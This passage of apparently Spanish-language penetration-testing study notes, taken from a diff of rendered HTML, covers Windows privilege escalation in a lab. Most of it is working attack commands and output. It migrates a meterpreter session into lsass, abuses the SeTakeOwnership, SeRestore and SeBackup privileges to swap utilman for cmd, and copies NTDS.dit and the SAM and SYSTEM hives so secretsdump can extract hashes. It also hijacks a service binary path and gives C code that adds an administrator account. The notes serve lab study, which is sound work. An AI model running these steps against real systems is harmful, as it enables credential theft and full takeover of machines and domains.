+<h3 id="migrar-proceso-lsass-a-un-proceso-con-sedebugprivilege">Migrar proceso lsass a un proceso con SeDebugPrivilege<a class="headerlink" href="#migrar-proceso-lsass-a-un-proceso-con-sedebugprivilege" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Si tenemos el privilegio SeDebugPrivilege podemos migrar el proceso lsass.</li>
+</ul>
+<div class="language-PowerShell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Public</span><span class="p">&gt;</span> <span class="nb">Get-Process</span> <span class="n">lsass</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">Get-Process</span> <span class="n">lsass</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">Handles</span>  <span class="n">NPM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>    <span class="n">PM</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>      <span class="n">WS</span><span class="p">(</span><span class="n">K</span><span class="p">)</span>     <span class="n">CPU</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>     <span class="n">Id</span>  <span class="nb">SI </span><span class="n">ProcessName</span>                                                  
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="p">-------</span>  <span class="p">------</span>    <span class="p">-----</span>      <span class="p">-----</span>     <span class="p">------</span>     <span class="p">--</span>  <span class="p">--</span> <span class="p">-----------</span>                                                  
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>   <span class="n">1299</span>      <span class="n">32</span>     <span class="n">7200</span>      <span class="n">19236</span>       <span class="n">5</span><span class="p">.</span><span class="n">56</span>    <span class="n">672</span>   <span class="n">0</span> <span class="n">lsass</span>                                          
+</span></code></pre></div>
+<hr />
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>meterpreter &gt; migrate 672
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>[*] Migrating from 6648 to 672...
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>[*] Migration completed successfully.
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>meterpreter &gt; getsystem
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>[-] Already running as SYSTEM
+</span></code></pre></div>
+<hr />
+<ul>
+<li>También podemos usar este script para activar todos los tokens privs <a href="https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1">EnableAllTokenPrivs</a></li>
+</ul>
+<h2 id="setakeownerprivilege">SeTakeOwnerPrivilege<a class="headerlink" href="#setakeownerprivilege" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Este privilegio permite la habilidad de tomar ownership de cualquier objeto.<ul>
+<li>NTFS, Registry, File, Process, Thread, Semaphore, Mutex, Desktop, Window Station, Message Queue, Job, and Section.</li>
+</ul>
+</li>
+<li>Este privilegio asigna permisos WRITE_OWNER para el objeto especificado.</li>
+<li>Se puede intentar habilitar este privilegio usando <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">el siguieunte script</a></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Enable-Privilege</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">EnableAllTokenPrivs</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="n">PRIVILEGES</span> <span class="n">INFORMATION</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="p">----------------------</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="n">Privilege</span> <span class="n">Name</span>                <span class="n">Description</span>                              <span class="n">State</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="p">=============================</span> <span class="p">========================================</span> <span class="p">=======</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="n">SeTakeOwnershipPrivilege</span>      <span class="n">Take</span> <span class="n">ownership</span> <span class="n">of</span> <span class="n">files</span> <span class="n">or</span> <span class="n">other</span> <span class="n">objects</span> <span class="n">Enabled</span>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="n">SeChangeNotifyPrivilege</span>       <span class="n">Bypass</span> <span class="n">traverse</span> <span class="n">checking</span>                 <span class="n">Enabled</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a><span class="n">SeIncreaseWorkingSetPrivilege</span> <span class="n">Increase</span> <span class="n">a</span> <span class="k">process</span> <span class="n">working</span> <span class="nb">set </span>          <span class="n">Enabled</span>
+</span></code></pre></div>
+<ul>
+<li>Después tenemos que elegir un archivo objetivo para la operación de tomar ownership.<ul>
+<li>Ejemplo: <code>cmd /c dir /q 'C:\Department Shares\Private\IT'</code><ul>
+<li>Explicación del comando:<ul>
+<li><code>cmd</code> es el comando que se va a ejecutar.</li>
+<li><code>/c</code> es la opción que indica que se va a ejecutar el comando.</li>
+<li><code>dir</code> es el comando que se va a ejecutar.</li>
+<li><code>/q</code> es la opción que indica que se va a mostrar el resultado de la operación.</li>
+<li><code>'C:\Department Shares\Private\IT'</code> es el objetivo de la operación de tomar ownership.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>`takeown /f 'C:\Department Shares\Private\IT\cred.txt'</li>
+<li><code>icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F</code></li>
+<li>Ahora con esto podemos tomar ownership de un archivo.</li>
+</ul>
+</li>
+</ul>
+<h3 id="en-donde-conviene-usar-esta-tecnica-de-tomar-ownership">En donde conviene usar esta técnica de tomar ownership<a class="headerlink" href="#en-donde-conviene-usar-esta-tecnica-de-tomar-ownership" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>c:\inetpub\wwwwroot\web.config
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>%WINDIR%\repair\sam
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>%WINDIR%\repair\system
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>%WINDIR%\repair\software, %WINDIR%\repair\security
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>%WINDIR%\system32\config\SecEvent.Evt
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>%WINDIR%\system32\config\default.sav
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>%WINDIR%\system32\config\security.sav
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>%WINDIR%\system32\config\software.sav
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>%WINDIR%\system32\config\system.sav
+</span></code></pre></div>
+<h2 id="serestoreprivilege">SeRestorePrivilege<a class="headerlink" href="#serestoreprivilege" title="Permanent link">&para;</a></h2>
+<ol>
+<li>Launch PowerShell/ISE with the SeRestore privilege present.</li>
+<li>Enable the privilege with Enable-SeRestorePrivilege).</li>
+<li>Rename utilman.exe to utilman.old</li>
+<li>Rename cmd.exe to utilman.exe</li>
+<li>Lock the console and press Win+U</li>
+<li><code>Rename-Item -Path "C:\Windows\System32\utilman.exe" -NewName "utilman.old"</code></li>
+<li><code>ren cmd.exe Utilman.exe</code></li>
+<li>Ahora podemos utilizar rdesktop para conectarnos a la maquina y ejecutar el cmd.exe con el privilegio SeRestorePrivilege.<ul>
+<li><code>rdesktop IP</code></li>
+<li>WIN + U<ul>
+<li><code>whoami =&gt; nt authority\system</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>También podemos reemplazar utilman por otra cosa, por ejemplo un reverse shell, o un binario que nos haga persistencia.</li>
+</ol>
+<h2 id="sebackupprivilege">SeBackupPrivilege<a class="headerlink" href="#sebackupprivilege" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Este privilegio permite la habilidad de leer cualquier archivo del sistema y realizar copias de seguridad de esos archivos.</li>
+<li><code>Get-SeBackupPrivilege</code></li>
+<li>Se puede intentar habilitar este privilegio usando <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">el siguieunte script</a></li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Set-SeBackupPrivilege</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">Get-SeBackupPrivilege</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">SeBackupPrivilege</span> <span class="n">is</span> <span class="n">enabled</span>
+</span></code></pre></div>
+<h3 id="copiar-un-archivo-protegido">Copiar un archivo protegido<a class="headerlink" href="#copiar-un-archivo-protegido" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>PS C:\htb&gt; Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt</code></li>
+</ul>
+<h4 id="atacando-el-dc-copiando-ntdsdit">Atacando el DC, copiando NTDS.dit<a class="headerlink" href="#atacando-el-dc-copiando-ntdsdit" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Este grupo también nos permite hacer cosas interesantes como tomar el NTSD.dit del DC y copiarlo en una maquina que no tenga permisos de administrador..<ul>
+<li>Este archivo contiene hashes NTLM de todos los usuarios bajo el dominio.</li>
+<li>Podemos utilizar diskshadow para copiar el disco C y exponerlo como disco E.</li>
+</ul>
+</li>
+</ul>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="n">diskshadow</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="n">Microsoft</span> <span class="n">DiskShadow</span> <span class="n">version</span> <span class="n">1</span><span class="p">.</span><span class="n">0</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="n">Copyright</span> <span class="p">(</span><span class="n">C</span><span class="p">)</span> <span class="n">2013</span> <span class="n">Microsoft</span> <span class="n">Corporation</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="n">On</span> <span class="n">computer</span><span class="p">:</span>  <span class="n">DC</span><span class="p">,</span>  <span class="n">10</span><span class="p">/</span><span class="n">14</span><span class="p">/</span><span class="n">2020</span> <span class="n">12</span><span class="p">:</span><span class="n">57</span><span class="p">:</span><span class="n">52</span> <span class="n">AM</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">verbose</span> <span class="n">on</span>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">metadata</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">meta</span><span class="p">.</span><span class="n">cab</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">context</span> <span class="n">clientaccessible</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="nb">set </span><span class="n">context</span> <span class="n">persistent</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="k">begin</span> <span class="n">backup</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">add</span> <span class="n">volume</span> <span class="n">C</span><span class="p">:</span> <span class="k">alias</span> <span class="n">cdrive</span>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">create</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">expose</span> <span class="k">%</span><span class="n">cdrive</span><span class="p">%</span> <span class="n">E</span><span class="p">:</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="k">end</span> <span class="n">backup</span>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="n">DISKSHADOW</span><span class="p">&gt;</span> <span class="n">exit</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">htb</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="n">E</span><span class="p">:</span>
+</span></code></pre></div>
+<ul>
+<li><code>Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit</code></li>
+</ul>
+<h4 id="copiando-los-registros-sam-y-system">Copiando los registros SAM y SYSTEM<a class="headerlink" href="#copiando-los-registros-sam-y-system" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Este privilegio también nos permite copiar los registros SAM y SYSTEM. Lo cual nos permite extraer credenciales de los usuarios mediante impacket-secretsdump.</li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>C:\htb&gt; reg save HKLM\SYSTEM SYSTEM.SAV
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>The operation completed successfully.
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>C:\htb&gt; reg save HKLM\SAM SAM.SAV
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>The operation completed successfully.
+</span></code></pre></div>
+<h4 id="extrayendo-los-hashes">Extrayendo los hashes<a class="headerlink" href="#extrayendo-los-hashes" title="Permanent link">&para;</a></h4>
+<ul>
+<li><code>impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code></li>
+</ul>
+<h3 id="usando-robocopy-para-copiar-archivos">Usando robocopy para copiar archivos<a class="headerlink" href="#usando-robocopy-para-copiar-archivos" title="Permanent link">&para;</a></h3>
+<ul>
+<li>Robocopy es un programa de Windows que nos permite copiar archivos de manera recursiva.</li>
+<li><code>C:\htb&gt; robocopy /B E:\Windows\NTDS .\ntds ntds.dit</code></li>
+</ul>
+<h2 id="abusar-de-servicios-con-permisos-debiles-mediante-su-binary-path">Abusar de servicios con permisos debiles mediante su binary path<a class="headerlink" href="#abusar-de-servicios-con-permisos-debiles-mediante-su-binary-path" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Muchas veces los servicios corren con permisos debiles y podemos abusar de esto cambiando el path de su binario.</li>
+<li>Para enumearar podemos utilizar SharpUp.<ul>
+<li><code>PS C:\htb&gt; .\SharpUp.exe audit</code></li>
+</ul>
+</li>
+<li>También podemos enumerar esto con PowerUp de PowerShell.<ul>
+<li><code>Import-Module .\PowerUp.ps1</code></li>
+<li><code>Get-ModifiableServiceFile</code></li>
+</ul>
+</li>
+</ul>
+<h3 id="reemplazando-el-binario-de-un-servicio">Reemplazando el binario de un servicio<a class="headerlink" href="#reemplazando-el-binario-de-un-servicio" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>C:\htb&gt; cmd /c copy /Y SecurityService.exe &quot;C:\Program Files (x86)\PCProtect\SecurityService.exe&quot;
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>C:\htb&gt; sc start SecurityService
+</span></code></pre></div>
+<h3 id="cambiando-el-path-binario-de-un-servicio">Cambiando el path binario de un servicio<a class="headerlink" href="#cambiando-el-path-binario-de-un-servicio" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>C:\htb&gt; sc config WindscribeService binpath="cmd /c net localgroup administrators USER /add"</code></li>
+<li><code>sc stop WindscribeService</code></li>
+<li><code>sc start WindscribeService</code></li>
+<li><code>net localgroup administrators</code></li>
+</ul>
+<h2 id="enumerar-servicios-ejecutandose">Enumerar servicios ejecutandose<a class="headerlink" href="#enumerar-servicios-ejecutandose" title="Permanent link">&para;</a></h2>
+<ul>
+<li><code>get-process</code>: Enumera los procesos que se estan ejecutando.<ul>
+<li><code>get-process -Id &lt;pid&gt;</code>: Enumera el proceso con el id especificado.</li>
+</ul>
+</li>
+<li><code>get-service</code>: Enumera los servicios que se estan ejecutando.</li>
+<li><code>Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}</code>: Enumera los servicios que se estan ejecutando.</li>
+<li><code>icacls C:\Windows\System32\spoolsv.exe</code>: Enumera los permisos del archivo spoolsv.exe.</li>
+</ul>
+<h3 id="la-utilidad-icacls-para-ver-permisos">La utilidad icacls para ver permisos<a class="headerlink" href="#la-utilidad-icacls-para-ver-permisos" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Máscara</th>
+<th>Permisos</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>F</td>
+<td>Acceso completo</td>
+</tr>
+<tr>
+<td>M</td>
+<td>Acceso de modificación</td>
+</tr>
+<tr>
+<td>RX</td>
+<td>Acceso de lectura y ejecución</td>
+</tr>
+<tr>
+<td>R</td>
+<td>Acceso de solo lectura</td>
+</tr>
+<tr>
+<td>W</td>
+<td>Acceso de solo escritura</td>
+</tr>
+</tbody>
+</table>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">dave</span><span class="p">&gt;</span> <span class="n">icacls</span> <span class="s2">&quot;C:\xampp\mysql\bin\mysqld.exe&quot;</span>
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">C</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">mysql</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">mysqld</span><span class="p">.</span><span class="n">exe</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">:(</span><span class="n">F</span><span class="p">)</span>
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>                              <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span><span class="p">:(</span><span class="n">F</span><span class="p">)</span>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>                              <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span><span class="p">:(</span><span class="n">F</span><span class="p">)</span>
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="n">Successfully</span> <span class="n">processed</span> <span class="n">1</span> <span class="n">files</span><span class="p">;</span> <span class="n">Failed</span> <span class="n">processing</span> <span class="n">0</span> <span class="n">files</span>
+</span></code></pre></div>
+<ul>
+<li>Lo que podemos hacer es cambiar el path de la binary a un archivo que queramos ejecutar, por ejemplo nc.exe o un archivo exe que ejecute una reverse shell.</li>
+</ul>
+<div class="language-C highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">()</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="p">{</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net user USER PASSWORD /add&quot;</span><span class="p">);</span>
+</span><span id="__span-14-8"><a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a><span class="w">  </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;net localgroup administrators USER /add&quot;</span><span class="p">);</span>
+</span><span id="__span-14-9"><a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
+</span><span id="__span-14-10"><a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+</span><span id="__span-14-11"><a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="p">}</span>
+</span></code></pre></div>
+<h4 id="compilando-el-binario">Compilando el binario<a class="headerlink" href="#compilando-el-binario" title="Permanent link">&para;</a></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>adduser.c<span class="w"> </span>-o<span class="w"> </span>adduser.exe
+</span></code></pre></div>
+<h4 id="compilando-el-binario-para-32-bits">Compilando el binario para 32 bits<a class="headerlink" href="#compilando-el-binario-para-32-bits" title="Permanent link">&para;</a></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>-----
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="sb">```</span>bash
+</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>rev.c<span class="w"> </span>-o<span class="w"> </span>rev.exe<span class="w"> </span>-lws2_32
+</span></code></pre></div>
+<h4 id="compilando-el-binario-para-32-bits-y-dll">Compilando el binario para 32 bits y DLL<a class="headerlink" href="#compilando-el-binario-para-32-bits-y-dll" title="Permanent link">&para;</a></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>----
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="sb">```</span>bash
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>i686-w64-mingw32-gcc<span class="w"> </span>-m32<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>gsm_codec.dll<span class="w"> </span><span class="m">45312</span>.c<span class="w"> </span>-luser32
+</span></code></pre></div>
+<h4 id="compilar-la-dll-64-bit">Compilar la DLL (64-bit)<a class="headerlink" href="#compilar-la-dll-64-bit" title="Permanent link">&para;</a></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>x86_64-w64-mingw32-g++<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>malicious.dll<span class="w"> </span>dllmain.cpp<span class="w"> </span>-lws2_32<span class="w"> </span>-static-libgcc<span class="w"> </span>-static-libstdc++
+</span></code></pre></div>
+<h4 id="para-32-bit-si-es-necesario">Para 32-bit (si es necesario)<a class="headerlink" href="#para-32-bit-si-es-necesario" title="Permanent link">&para;</a></h4>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>i686-w64-mingw32-g++<span class="w"> </span>-shared<span class="w"> </span>-o<span class="w"> </span>malicious32.dll<span class="w"> </span>dllmain.cpp<span class="w"> </span>-lws2_32<span class="w"> </span>-static-libgcc<span class="w"> </span>-static-libstdc++
+</span></code></pre></div>
+<hr />
+<ul>
+<li>Movemos el binario mysql original, subimos el nuestro y cambiamos el path del servicio.</li>
